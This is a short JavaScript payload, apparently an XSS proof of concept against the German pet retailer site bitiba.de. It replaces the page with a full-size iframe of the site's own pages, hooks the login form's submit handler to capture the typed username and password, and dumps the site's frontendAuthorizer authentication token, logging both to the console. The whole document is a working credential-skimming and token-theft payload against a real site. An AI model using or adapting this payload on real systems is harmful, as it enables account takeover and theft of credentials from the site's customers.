console.log("KHARAONE >>>>>>>>>>>> DOMAIN IS :" + document.domain);
var a=document.createElement("iframe");
a.src="https://www.bitiba.de/checkout/logout.htm";
a.name="mainsite";
a.width="100%";
a.height="700px";
document.body.innerHTML="";
document.body.appendChild(a);
function formHandler(e){
  console.log(e);
  if(e?.srcElement.length>0){
    console.log("The credentials are been spied on: \n" 
    + "Login is : "+ e.srcElement[1].value +"\n"
    + "Password is : "+ e.srcElement[2].value +"\n"
    );
  }
}

function dumpToken(){
  console.log(mainsite.frontendAuthorizer);
}

function hookMessageHandler(){
    mainsite.loginForm.onsubmit = (e) => {formHandler(e);};
}
mainsite.location = "https://www.bitiba.de/account/overview"
setTimeout(hookMessageHandler, 3000);
setTimeout(dumpToken, 5000);
